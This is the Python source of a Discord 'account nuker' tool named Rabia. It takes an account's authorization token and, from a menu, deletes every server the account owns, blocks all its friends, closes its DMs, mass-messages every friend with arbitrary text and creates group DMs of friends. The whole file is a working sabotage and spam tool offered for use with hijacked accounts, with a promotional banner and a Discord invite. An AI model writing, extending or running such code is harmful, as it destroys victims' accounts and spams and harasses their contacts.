import requests
import json
import string
import random
import pretty_errors
import time
import multiprocessing
import sys
import colorama

from colorama import Style, Fore
from time import sleep
from multiprocessing import current_process

colorama.init(autoreset=True)

Test_Token = input("Enter A Token: ")


def generate_random_string(Ammount):
    string_returned = "".join(
        random.choice(string.ascii_letters) for i in range(0, Ammount)
    )
    return string_returned


def delete_personal_guilds(Token):
    headers = {"authorization": Token, "user-agent": "Mozilla/5.0"}
    delete_personal_request = requests.get(
        "https://discord.com/api/v9/users/@me/guilds", headers=headers
    ).json()
    for i in delete_personal_request:
        requests.post(
            f"https://canary.discord.com/api/v9/guilds/{i['id']}/delete",
            headers=headers,
        )
        print(f"{Fore.GREEN}Deleted Server {i['id']}")


def block_all_token_friends(Token):
    headers = {"authorization": Token, "user-agent": "bruh6/9"}
    json = {"type": 2}
    block_friends_request = requests.get(
        "https://canary.discord.com/api/v8/users/@me/relationships", headers=headers
    ).json()
    for i in block_friends_request:
        requests.put(
            f"https://canary.discord.com/api/v8/users/@me/relationships/{i['id']}",
            headers=headers,
            json=json,
        )
        print(f"{Fore.GREEN}Blocked Friend {i['id']}")


def close_all_dms(Token):
    headers = {"authorization": Token, "user-agent": "Samsung Fridge/6.9"}
    close_dm_request = requests.get(
        "https://canary.discord.com/api/v8/users/@me/channels", headers=headers
    ).json()
    for channel in close_dm_request:
        requests.delete(
            f"https://canary.discord.com/api/v8/channels/{channel['id']}",
            headers=headers,
        )
        print(f"{Fore.GREEN}Closed DM {channel['id']}")


def send_mass_dm(Token, message):
    headers = {"authorization": Token, "user-agent": "Samsung Fridge/6.9"}
    friends_request = requests.get(
        "https://canary.discord.com/api/v8/users/@me/relationships", headers=headers
    ).json()
    for friend in friends_request:
        json = {"recipient_id": friend["id"]}
        create_dm_request = requests.post(
            "https://canary.discord.com/api/v8/users/@me/channels",
            headers=headers,
            json=json,
        ).json()
        channel_id = create_dm_request["id"]
        json = {"content": message}
        requests.post(
            f"https://canary.discord.com/api/v8/channels/{channel_id}/messages",
            headers=headers,
            json=json,
        )
        print(f"{Fore.GREEN}Sent DM to {friend['user']['username']}#{friend['user']['discriminator']}")


def create_dm_groups(Token):
    headers = {"authorization": Token, "user-agent": "Samsung Fridge/6.9"}
    friends_request = requests.get(
        "https://canary.discord.com/api/v8/users/@me/relationships", headers=headers
    ).json()
    friend_ids = [friend["id"] for friend in friends_request]
    group_size = 10  # Adjust the size of the groups as needed
    for i in range(0, len(friend_ids), group_size):
        json = {"recipients": friend_ids[i:i + group_size]}
        create_group_request = requests.post(
            "https://canary.discord.com/api/v8/users/@me/channels",
            headers=headers,
            json=json,
        )
        print(f"{Fore.GREEN}Created Group DM with {len(json['recipients'])} friends")


options_list = {
    "1": delete_personal_guilds,
    "2": block_all_token_friends,
    "3": close_all_dms,
    "4": send_mass_dm,
    "5": create_dm_groups,
}


def main():
    print("https://github.com/Yael-AL4/Rabia-acc-nuker-discord")
    print(f"{Fore.GREEN}")
    print(f"{Fore.RED}██████╗  █████╗ ██████╗ ██╗ █████╗")
    print(f"{Fore.WHITE}██╔══██╗██╔══██╗██╔══██╗██║██╔══██╗")
    print(f"{Fore.GREEN}██████╔╝███████║██████╔╝██║███████║")
    print(f"{Fore.YELLOW}██╔══██╗██╔══██║██╔══██╗██║██╔══██║")
    print(f"{Fore.BLUE}██║  ██║██║  ██║██████╔╝██║██║  ██║")
    print(f"{Fore.LIGHTMAGENTA_EX}╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═╝╚═╝  ╚═╝")
    print(f"{Fore.LIGHTGREEN_EX}")
    print(Fore.BLUE + """by NAN Squad Join for R bot and free tools and
self bots https://discord.gg/E9ajKqHm Yaell
          
|  free version   
|
|  Rabia account nuker
|____________________________""")

    for count, i in enumerate(options_list, start=1):
        separate_options = str(options_list[i]).split("<function ")
        print(
            f"{Fore.GREEN}[{Fore.GREEN}{count}{Fore.GREEN}]",
            f"{Fore.GREEN}{str(separate_options[1]).split(' at ')[0].replace('_', ' ').upper()}",
        )
    choose_nuke = input("Please Enter An Option From The List: ")
    if choose_nuke == "4":
        message = input("Enter the message to send: ")
        options_list[choose_nuke](Test_Token, message)
    elif choose_nuke in options_list:
        options_list[choose_nuke](Test_Token)


if __name__ == "__main__":
    while 1:
        try:
            main()
        except KeyboardInterrupt:
            sys.exit()
